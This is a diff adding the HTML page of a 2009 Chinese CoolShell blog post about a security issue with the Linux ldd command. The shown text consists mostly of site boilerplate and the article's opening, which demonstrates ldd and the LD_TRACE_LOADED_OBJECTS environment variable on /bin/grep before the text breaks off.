@@ -1,0 +1,959 @@
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <link href="https://gmpg.org/xfn/11" rel="profile"/>
+  <link href="https://coolshell.cn/xmlrpc.php" rel="pingback"/>
+  <link href="/favicon.png" rel="shortcut icon"/>
+  <link href="https://coolshell.cn/articles/1626.html" rel="canonical">
+   <meta content="All in One SEO (AIOSEO) 4.3.6.1 " name="generator"/>
+   <meta content="zh_CN" property="og:locale"/>
+   <meta content="酷 壳 - CoolShell" property="og:site_name"/>
+   <meta content="article" property="og:type"/>
+   <meta content="ldd 的一个安全问题 | 酷 壳 - CoolShell" property="og:title"/>
+   <meta content="https://coolshell.cn/articles/1626.html" property="og:url"/>
+   <meta content="https://coolshell.cn/wp-content/uploads/2020/04/mini.logo_.png" property="og:image"/>
+   <meta content="https://coolshell.cn/wp-content/uploads/2020/04/mini.logo_.png" property="og:image:secure_url"/>
+   <meta content="306" property="og:image:width"/>
+   <meta content="306" property="og:image:height"/>
+   <meta content="2009-10-27T16:15:46+00:00" property="article:published_time"/>
+   <meta content="2009-10-28T03:23:07+00:00" property="article:modified_time"/>
+   <meta content="summary" name="twitter:card"/>
+   <meta content="ldd 的一个安全问题 | 酷 壳 - CoolShell" name="twitter:title"/>
+   <meta content="https://coolshell.cn/wp-content/uploads/2020/04/mini.logo_.png" name="twitter:image"/>
+   <script class="aioseo-schema" type="application/ld+json">
+    {"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/coolshell.cn\/articles\/1626.html#article","name":"ldd \u7684\u4e00\u4e2a\u5b89\u5168\u95ee\u9898 | \u9177 \u58f3 - CoolShell","headline":"ldd \u7684\u4e00\u4e2a\u5b89\u5168\u95ee\u9898","author":{"@id":"https:\/\/coolshell.cn\/articles\/author\/haoel#author"},"publisher":{"@id":"https:\/\/coolshell.cn\/#organization"},"image":{"@type":"ImageObject","url":"https:\/\/coolshell.cn\/wp-content\/uploads\/2020\/04\/mini.logo_.png","@id":"https:\/\/coolshell.cn\/#articleImage","width":306,"height":306},"datePublished":"2009-10-27T16:15:46+08:00","dateModified":"2009-10-28T03:23:07+08:00","inLanguage":"zh-CN","commentCount":41,"mainEntityOfPage":{"@id":"https:\/\/coolshell.cn\/articles\/1626.html#webpage"},"isPartOf":{"@id":"https:\/\/coolshell.cn\/articles\/1626.html#webpage"},"articleSection":"Unix\/Linux, \u7f16\u7a0b\u5de5\u5177, \u7f51\u7edc\u5b89\u5168, ldd, Linux"},{"@type":"BreadcrumbList","@id":"https:\/\/coolshell.cn\/articles\/1626.html#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/coolshell.cn\/#listItem","position":1,"item":{"@type":"WebPage","@id":"https:\/\/coolshell.cn\/","name":"\u4e3b\u9801","description":"\u4eab\u53d7\u7f16\u7a0b\u548c\u6280\u672f\u6240\u5e26\u6765\u7684\u5feb\u4e50 \u2013 https:\/\/coolshell.cn","url":"https:\/\/coolshell.cn\/"}}]},{"@type":"Organization","@id":"https:\/\/coolshell.cn\/#organization","name":"\u9177\u58f3-CoolShell","url":"https:\/\/coolshell.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/coolshell.cn\/wp-content\/uploads\/2020\/04\/mini.logo_.png","@id":"https:\/\/coolshell.cn\/#organizationLogo","width":306,"height":306},"image":{"@id":"https:\/\/coolshell.cn\/#organizationLogo"}},{"@type":"Person","@id":"https:\/\/coolshell.cn\/articles\/author\/haoel#author","url":"https:\/\/coolshell.cn\/articles\/author\/haoel","name":"\u9648\u7693","image":{"@type":"ImageObject","@id":"https:\/\/coolshell.cn\/articles\/1626.html#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/af2fbb7372dd5826e44d87e6ceccea40?s=96&d=mm&r=g","width":96,"height":96,"caption":"\u9648\u7693"}},{"@type":"WebPage","@id":"https:\/\/coolshell.cn\/articles\/1626.html#webpage","url":"https:\/\/coolshell.cn\/articles\/1626.html","name":"ldd \u7684\u4e00\u4e2a\u5b89\u5168\u95ee\u9898 | \u9177 \u58f3 - CoolShell","inLanguage":"zh-CN","isPartOf":{"@id":"https:\/\/coolshell.cn\/#website"},"breadcrumb":{"@id":"https:\/\/coolshell.cn\/articles\/1626.html#breadcrumblist"},"author":{"@id":"https:\/\/coolshell.cn\/articles\/author\/haoel#author"},"creator":{"@id":"https:\/\/coolshell.cn\/articles\/author\/haoel#author"},"datePublished":"2009-10-27T16:15:46+08:00","dateModified":"2009-10-28T03:23:07+08:00"},{"@type":"WebSite","@id":"https:\/\/coolshell.cn\/#website","url":"https:\/\/coolshell.cn\/","name":"\u9177 \u58f3 - CoolShell","description":"\u4eab\u53d7\u7f16\u7a0b\u548c\u6280\u672f\u6240\u5e26\u6765\u7684\u5feb\u4e50 - Coding Your Ambition","inLanguage":"zh-CN","publisher":{"@id":"https:\/\/coolshell.cn\/#organization"}}]}
+   </script>
+   <script type="text/javascript">
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+			ga('create', "UA-7486123-1", { 'cookieDomain': 'coolshell.cn' } );
+			ga('send', 'pageview');
+   </script>
+   <script async="" src="https://www.google-analytics.com/analytics.js">
+   </script>
+   <script type="text/javascript">
+    window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/coolshell.cn\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.2"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){p.clearRect(0,0,i.width,i.height),p.fillText(e,0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(t,0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s("\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!s("\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!s("\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!s("\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
+   </script>
+   <script id="jquery-core-js" src="https://coolshell.cn/wp-includes/js/jquery/jquery.min.js?ver=3.6.3" type="text/javascript">
+   </script>
+   <script id="jquery-migrate-js" src="https://coolshell.cn/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.0" type="text/javascript">
+   </script>
+   <script id="series-js" src="https://coolshell.cn/wp-content/plugins/simple-post-series/autohide.js?ver=2.4" type="text/javascript">
+   </script>
+   <script id="ez-toc-scroll-scriptjs-js-after" type="text/javascript">
+    jQuery(document).ready(function(){document.querySelectorAll(".ez-toc-section").forEach(t=>{t.setAttribute("ez-toc-data-id","#"+decodeURI(t.getAttribute("id")))}),jQuery("a.ez-toc-link").click(function(){let t=jQuery(this).attr("href"),e=jQuery("#wpadminbar"),i=0;30>30&&(i=30),e.length&&(i+=e.height()),jQuery('[ez-toc-data-id="'+decodeURI(t)+'"]').length>0&&(i=jQuery('[ez-toc-data-id="'+decodeURI(t)+'"]').offset().top-i),jQuery("html, body").animate({scrollTop:i},500)})});
+   </script>
+   <!--[if lt IE 9]>
+<script type='text/javascript' src='https://coolshell.cn/wp-content/themes/MyNisarg/js/html5shiv.js?ver=3.7.3' id='html5shiv-js'></script>
+<![endif]-->
+   <meta content="WordPress 6.2" name="generator"/>
+   <script type="text/javascript">
+    window._wp_rp_static_base_url = 'https://wprp.zemanta.com/static/';
+	window._wp_rp_wp_ajax_url = "https://coolshell.cn/wp-admin/admin-ajax.php";
+	window._wp_rp_plugin_version = '3.6.4';
+	window._wp_rp_post_id = '1626';
+	window._wp_rp_num_rel_posts = '6';
+	window._wp_rp_thumbnails = true;
+	window._wp_rp_post_title = 'ldd+%E7%9A%84%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98';
+	window._wp_rp_post_tags = ['linux', 'ldd', '%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7', '%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8', 'unix%2Flinux', 'cd', '2', 'make', 'app', 'bash', 'patch', 'tar', 'rf', 'linux', 'lt', 'file', 'gt', 'rm', 'shell'];
+	window._wp_rp_promoted_content = true;
+   </script>
+  </link>
+  <link href="//fonts.googleapis.com" rel="dns-prefetch"/>
+  <link href="https://coolshell.cn/feed" rel="alternate" title="酷 壳 - CoolShell » Feed" type="application/rss+xml"/>
+  <link href="https://coolshell.cn/comments/feed" rel="alternate" title="酷 壳 - CoolShell » 评论Feed" type="application/rss+xml"/>
+  <link href="https://coolshell.cn/articles/1626.html/feed" rel="alternate" title="酷 壳 - CoolShell » ldd 的一个安全问题评论Feed" type="application/rss+xml"/>
+  <style type="text/css">
+   img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+  </style>
+  <link href="https://coolshell.cn/wp-content/plugins/simple-post-series/inc/icomoon/style.css?ver=2.4" id="series_font-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-content/plugins/gutenberg/build/block-library/style.css?ver=15.7.0" id="wp-block-library-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-includes/css/classic-themes.min.css?ver=6.2" id="classic-theme-styles-css" media="all" rel="stylesheet" type="text/css"/>
+  <style id="global-styles-inline-css" type="text/css">
+   body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+  </style>
+  <link href="https://coolshell.cn/wp-content/plugins/wp-postratings/css/postratings-css.css?ver=1.90.1" id="wp-postratings-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70" id="wp-pagenavi-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-content/plugins/easy-table-of-contents/assets/css/screen.min.css?ver=2.0.48" id="ez-toc-css" media="all" rel="stylesheet" type="text/css"/>
+  <style id="ez-toc-inline-css" type="text/css">
+   div#ez-toc-container p.ez-toc-title {font-size: 120%;}div#ez-toc-container p.ez-toc-title {font-weight: 500;}div#ez-toc-container ul li {font-size: 95%;}div#ez-toc-container nav ul ul li ul li {font-size: %!important;}
+.ez-toc-container-direction {direction: ltr;}.ez-toc-counter ul{counter-reset: item;}.ez-toc-counter nav ul li a::before {content: counters(item, ".", decimal) ". ";display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left;}.ez-toc-widget-direction {direction: ltr;}.ez-toc-widget-container ul{counter-reset: item;}.ez-toc-widget-container nav ul li a::before {content: counters(item, ".", decimal) ". ";display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left;}
+  </style>
+  <link href="https://coolshell.cn/wp-content/themes/MyNisarg/css/bootstrap.css?ver=6.2" id="bootstrap-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-content/themes/MyNisarg/style.css?ver=6.2" id="nisarg-style-css" media="all" rel="stylesheet" type="text/css"/>
+  <style id="nisarg-style-inline-css" type="text/css">
+   /* Color Scheme */
+
+	/* Accent Color */
+
+	a:active,
+	a:hover,
+	a:focus {
+	    color: #009688;
+	}
+
+	.navbar-default .navbar-nav > li > a:hover, .navbar-default .navbar-nav > li > a:focus {
+		color: #009688;
+	}
+
+	
+	.navbar-default .navbar-nav > .active > a, .navbar-default .navbar-nav > .active > a:hover, .navbar-default .navbar-nav > .active > a:focus {
+		color: #009688;			
+	}
+
+	@media (min-width: 768px){
+		.navbar-default .navbar-nav > .active > a, .navbar-default .navbar-nav > .active > a:hover, .navbar-default .navbar-nav > .active > a:focus {
+			border-top: 4px solid #009688;
+		}		
+	}
+
+	.dropdown-menu > .active > a, .dropdown-menu > .active > a:hover, .dropdown-menu > .active > a:focus {	    
+	    background-color: #009688;
+	}
+
+
+	.navbar-default .navbar-nav > .open > a, .navbar-default .navbar-nav > .open > a:hover, .navbar-default .navbar-nav > .open > a:focus {
+		color: #009688;
+	}
+
+	.navbar-default .navbar-nav > li > .dropdown-menu > li > a:hover,
+	.navbar-default .navbar-nav > li > .dropdown-menu > li > a:focus {
+		color: #fff;
+		background-color: #009688;
+	}
+
+	.navbar-default .navbar-nav .open .dropdown-menu > .active > a, .navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover, .navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus {
+		background-color: #fff;
+		color: #009688;
+	}
+
+	@media (max-width: 767px) {
+		.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover {
+			background-color: #009688;
+			color: #fff;
+		}
+	}
+
+	.sticky-post{
+	    background: #009688;
+	    color:white;
+	}
+	
+	.entry-title a:hover,
+	.entry-title a:focus{
+	    color: #009688;
+	}
+
+	.entry-header .entry-meta::after{
+	    background: #009688;
+	}
+
+	.fa {
+		color: #009688;
+	}
+
+	.btn-default{
+		border-bottom: 1px solid #009688;
+	}
+
+	.btn-default:hover, .btn-default:focus{
+	    border-bottom: 1px solid #009688;
+	    background-color: #009688;
+	}
+
+	.nav-previous:hover, .nav-next:hover{
+	    border: 1px solid #009688;
+	    background-color: #009688;
+	}
+
+	.next-post a:hover,.prev-post a:hover{
+	    color: #009688;
+	}
+
+	.posts-navigation .next-post a:hover .fa, .posts-navigation .prev-post a:hover .fa{
+	    color: #009688;
+	}
+
+
+	#secondary .widget-title::after{
+		background-color: #009688;
+	    content: "";
+	    position: absolute;
+	    width: 75px;
+	    display: block;
+	    height: 4px;    
+	    bottom: -15px;
+	}
+
+	#secondary .widget a:hover,
+	#secondary .widget a:focus{
+		color: #009688;
+	}
+
+	#secondary .widget_calendar tbody a {
+	    background-color: #009688;
+	    color: #fff;
+	    padding: 0.2em;
+	}
+
+	#secondary .widget_calendar tbody a:hover{
+	    background-color: #009688;
+	    color: #fff;
+	    padding: 0.2em;
+	}
+  </style>
+  <link href="https://coolshell.cn/wp-content/themes/MyNisarg/font-awesome/css/font-awesome.min.css?ver=6.2" id="font-awesome-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Lato:400,300italic,700|Source+Sans+Pro:400,400italic" id="nisarggooglefonts-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=0cuVQBPCj0viGB0" id="enlighterjs-css" media="all" rel="stylesheet" type="text/css"/>
+  <link href="https://coolshell.cn/wp-json/" rel="https://api.w.org/"/>
+  <link href="https://coolshell.cn/wp-json/wp/v2/posts/1626" rel="alternate" type="application/json"/>
+  <link href="https://coolshell.cn/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+  <link href="https://coolshell.cn/wp-includes/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+  <link href="https://coolshell.cn/?p=1626" rel="shortlink"/>
+  <link href="https://coolshell.cn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F1626.html" rel="alternate" type="application/json+oembed"/>
+  <link href="https://coolshell.cn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F1626.html&amp;format=xml" rel="alternate" type="text/xml+oembed"/>
+  <link href="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/themes/vertical-m.css?version=3.6.4" rel="stylesheet"/>
+  <style type="text/css">
+   .site-header { background: #1d2b2d; }
+  </style>
+ </head>
+ <body>
+  <article class="post-content post-1626 post type-post status-publish format-standard hentry category-unixlinux category-tools category-netsecurity tag-ldd tag-linux" id="post-1626">
+   <header class="entry-header">
+    <span class="screen-reader-text">
+     ldd 的一个安全问题
+    </span>
+    <h1 class="entry-title">
+     ldd 的一个安全问题
+    </h1>
+    <div class="entry-meta">
+     <h5 class="entry-date">
+      <i class="fa fa-calendar-o">
+      </i>
+      <a href="https://coolshell.cn/articles/1626.html" rel="bookmark" title="00:15">
+       <time class="entry-date" datetime="2009-10-28T00:15:46+08:00" pubdate="">
+        2009年10月28日
+       </time>
+      </a>
+      <span class="byline">
+       <span class="sep">
+       </span>
+       <i class="fa fa-user">
+       </i>
+       <span class="author vcard">
+        <a class="url fn n" href="https://coolshell.cn/articles/author/haoel" rel="author" title="View all posts by 陈皓">
+         陈皓
+        </a>
+       </span>
+      </span>
+      <i class="fa fa-comments-o">
+      </i>
+      <span class="screen-reader-text">
+       评论
+      </span>
+      <a class="comments-link" href="https://coolshell.cn/articles/1626.html#comments">
+       41 条评论
+      </a>
+      <i class="fa fa-users" style="margin-left:10px;">
+      </i>
+      26,170 人阅读
+     </h5>
+    </div>
+   </header>
+   <div class="entry-content">
+    <p>
+     <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158">
+     </script>
+     我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。
+    </p>
+    <p>
+     首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">(1) $ ldd /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
+        /lib/ld-linux.so.2 (0xb801e000)
+
+(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
+        /lib/ld-linux.so.2 (0xb7f84000)
+
+(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
+        /lib/ld-linux.so.2 (0xb80d0000)</pre>
+    <p>
+     第(1)个命令，我们运行了
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     于
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      /bin/grep
+     </code>
+     。我们可以看到命令的输出是我们想要的，那就是
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      /bin/grep
+     </code>
+     所依赖的动态链接库。
+    </p>
+    <p>
+     第(2)个命令设置了一个叫 LD_TRACE_LOADED_OBJECTS 的环境变量，然后就好像在运行命令
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      /bin/grep
+     </code>
+     (但其实并不是)。 其运行结果和ldd的输出是一样的！
+    </p>
+    <p>
+     第(3)个命令也是设置了环境变量 LD_TRACE_LOADED_OBJECTS ，然后调用了动态链接库
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ld-linux.so
+     </code>
+     并把
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      /bin/grep
+     </code>
+     作为参数传给它。我们发现，其输出结果还是和前面两个一样的。
+    </p>
+    <p>
